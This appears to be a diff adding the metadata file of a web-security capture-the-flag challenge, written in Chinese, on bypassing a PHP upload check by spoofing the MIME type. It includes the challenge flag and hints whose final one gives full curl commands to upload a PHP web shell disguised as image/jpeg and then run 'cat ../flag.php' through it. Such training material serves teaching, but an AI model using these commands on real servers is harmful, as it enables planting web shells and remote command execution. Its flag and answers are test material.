@@ -1,0 +1,23 @@
+{
+  "id": "upload2",
+  "category": "upload",
+  "title": "MIME 校验绕过",
+  "difficulty": "easy",
+  "url_path": "/upload2",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{upload2_383a7ff6}",
+  "knowledge": [
+    "$_FILES type 可伪造",
+    "curl -F 指定 part Content-Type",
+    "finfo 内容探测 vs 自报头"
+  ],
+  "hints": [
+    "直接用浏览器传 shell.php 会被拦（浏览器会如实填 text/x-php）。但 $_FILES['avatar']['type'] 只是把你请求头里自己写的 Content-Type 抄了一遍——用能自定义请求的工具再试。",
+    "curl 的 -F 参数可以给每个 part 单独指定类型：curl -F \"avatar=@shell.php;type=image/jpeg\" —— 文件名还是 .php，类型却是 image/jpeg。",
+    "完整命令：\ncurl -F \"avatar=@shell.php;type=image/jpeg\" http://TARGET/upload2/\ncurl \"http://TARGET/upload2/uploads/shell.php?f=../flag.php\"（shell 用读文件版）或 ?c=cat%20../flag.php（system 版）"
+  ],
+  "writeup": "writeup.md",
+  "prev": "upload1",
+  "next": "upload3"
+}
